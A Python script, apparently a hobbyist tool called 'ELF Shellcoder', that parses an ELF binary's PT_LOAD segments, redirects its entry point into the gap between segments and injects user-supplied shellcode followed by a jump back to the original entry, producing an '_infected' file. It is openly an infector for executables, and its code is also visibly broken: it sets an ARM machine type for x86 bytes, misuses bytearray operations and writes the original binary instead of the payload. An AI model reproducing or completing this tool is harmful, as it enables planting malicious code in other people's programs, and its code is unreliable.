#coding:utf-8

import sys
import os
from pwn import *
import binascii
import struct
import lief
from time import sleep
from elftools.elf.elffile import ELFFile
from elftools.elf.enums import ENUM_E_MACHINE

BASE_ADRESS = 0x0000000000400000 #probably also to change
SHELLCODE_X = "shellcode" #to complete with your shellcode executable

os.system("clear")


def banner():
    #
    # Bannière rdm au début du prog
    #

    banner = """                                                            ___
                                             ________.-----''
                                    ___.--'""___.----''
                                 .-'    _.-'"
                      _ .-.__.--'    .-'
                    .' `  / ' __ _.-'
                    ) '  '   )   /`-._.
                   (.'\          )/))-)\\
                 .'    >.________.--'
              .-'   .-'
            .'    .'
         .-'   .-'
       .'    .'
      /    .'      _____ _     ______   _____ _          _ _               _           
    .'   .'       |  ___| |    |  ___| /  ___| |        | | |             | |          
   /  ,,/         | |__ | |    | |_    \ `--.| |__   ___| | | ___ ___   __| | ___ _ __ 
  /'''/           |  __|| |    |  _|    `--. \ '_ \ / _ \ | |/ __/ _ \ / _` |/ _ \ '__|
 / ,''            | |___| |____| |     /\__/ / | | |  __/ | | (_| (_) | (_| |  __/ |   
/''               \____/\_____/\_|     \____/|_| |_|\___|_|_|\___\___/ \__,_|\___|_|   

                    
                    
                        [+] GitHub : https://github.com/saymant [+]
                      [+] Twitter : https://twitter.com/__saymant [+] 

"""
    print('\033[0;36m\\' + banner + '\033[37m')


def usage():
    
    try:
        global file
        file = str(sys.argv[1])
    except IndexError:
        print("Usage : python3 {} <binary>".format(sys.argv[0]))
        exit(1)
    
    try:
        with open(file):
           print("[+] Opening \"{}\" file ...".format(file))
           sleep(1)
           pass
    except IOError:
        print('[-]' + '\033[0;31m\\' + 'Wrong !' + '\033[37m' ' The file could not be opened').strip("\\")
        exit(1)

def formate():
    global file_format
    global bits
    
    size_min = len(sys.argv[1])
    size_min += 2
    size_max = size_min + 11

    print("[+] File Format Analysis ...")
    sleep(1)

    os.system("file {} > format_file.txt".format(str(sys.argv[1])))
    f = open("format_file.txt", "r")
    form = f.read()

    BUFF  = os.popen("file {} | grep -oi elf".format(str(sys.argv[1]))).read()

    if BUFF.rstrip() == "ELF":
        base = form[size_min:size_max]
        file_format = base.strip("64-bit")
        file_format = base.strip("32-bit")
        
        if file_format == "ELF 64-bit":
            bits = 64
        elif file_format == "ELF 32-bit":
           bits = 32 

        print("[+] File format : " + file_format)

        os.system("rm format_file.txt")
        sleep(1)


    else:
        print("[-] The selected file is not an ELF, please restart the script")
        os.system("rm format_file.txt")
        exit(1)

def loader():
    global entry_point
    global pt_load_1_start
    global pt_load_1_end
    global pt_load_2_start
    global pt_load_2_end
    global space

    os.popen("readelf -l {} > out.txt".format(str(sys.argv[1])))
    sleep(1)
    f = open("out.txt", "r")

    lines = f.readlines()

    all_load_str = []
    
    entry_point = ''

    for line in lines:
        if "Point d'entrée" in line:
            entry_point = line.split("Point d'entrée ")[1]

    for (i, l) in enumerate(lines):
            if l.strip().startswith("LOAD"):
                temp_tab = [x for x in l.rstrip().split(" ") if x != ""][1:]
                #all_load_str.append(temp_tab)

                l = lines[i+1]

                temp_tab.extend([x for x in l.rstrip().split(" ") if x != ""])
                all_load_str.append(temp_tab)
    
    if len(all_load_str) < 2:
        print("[-] Don't found two PT_LOAD segment.")
        exit(1)
    
    else:
        print("[+] PT_LOAD segments number : %s\n" % len(all_load_str))
        print("Entrypoint : {}".format(entry_point))
        sleep(1)

    l = []
    i = 0

    for (x, tab) in enumerate(all_load_str):
        
        print("\n[+] PT_LOAD number %s [+]" % x)
        print("")
        print("Offset        : {}".format(tab[0]))
        print("Segment size  : {}".format(tab[3]))
        print("")

        if i == 0:
            pt_load_1_start = tab[0]
            pt_load_1_end = tab[3]
            
            start_addr = tab[1]  # Adresse de base où sera mappé le fichier
        
        else:
            pt_load_2_start = tab[0]
            pt_load_2_end = hex(int(pt_load_2_start, 16) + int(tab[3], 16))
        
        
        i += 1
    
    space = hex(int(pt_load_2_start, 16) - int(pt_load_1_end, 16))
    print("Maximum size of the code to be injected : {} bytes\n".format(int(space, 16)))


def infect_entry_point():
    global start_shellcode

    binary = lief.parse(file)
    header = binary.header  

    print(pt_load_1_end)

    start_shellcode = int(BASE_ADRESS) + int(pt_load_1_end, 16)
    
    header.entrypoint = start_shellcode
    if bits == 64:
        header.machine_type = lief.ELF.ARCH.AARCH64
    
    elif bits == 32:
        header.machine_type = lief.ELF.ARCH.AARCH32

    binary.write("{}_patched".format(file))

def injection():
    
    global start_code
    fd = open(file, "rb+")
    binary = fd.read()

    SHELLCODE = open("{}".format(SHELLCODE_X), "rb+")


    elf_patch = ELF('{}_patched'.format(sys.argv[1]))

    start_code = hex(int(BASE_ADRESS) + int(pt_load_1_end, 16))
    print(start_code)
    
    elf = ELF(file)

    found_loadable = 0
    for s in elf.iter_segments():
        if s["p_type"] == "PT_LOAD" and s["p_flags"] & 1:
            segmentUse = s
            found_loadable = 1

    if(found_loadable != 0):
        print("[*] Found a segment which is loadable and executable !")
    else:
        print("[-] Loadable segment was not found :(")
        return 0
	
    byteshell = bytearray(SHELLCODE)

    if bits == 64:
        byteshell += b'\x48\x31\xc0'
        byteshell += b'\x48\x31\xdb'
        byteshell += b'\x48\x31\xc9'
        byteshell += b'\x48\x31\xd2'
        byteshell += b'\x48\x31\xf6'
    else:
        byteshell += b'\x31\xc0'
        byteshell += b'\x31\xdb'
        byteshell += b'\x31\xc9'
        byteshell += b'\x31\xd2'
        byteshell += b'\x31\xf6'

    if bits == 64:
        byteshell.append(0xbd)
        byteshell.append(p64(int(entry_point)))
        byteshell.append(0xff)
        byteshell.append(0xe5)
    else:
        byteshell.append(0xbd)
        byteshell.append(p32(int(entry_point)))
        byteshell.append(0xff)
        byteshell.append(0xe5)   


    newName = file + "_infected"
    infectedFile = open(newName,"wb")
    infectedFile.write(binary)
    infectedFile.close()

    fd.seek(int(pt_load_1_end, 16))
    fd.write(binary)
    fd.close()

banner()

usage()
formate()
loader()
infect_entry_point()
injection()

print("Injected correctly")
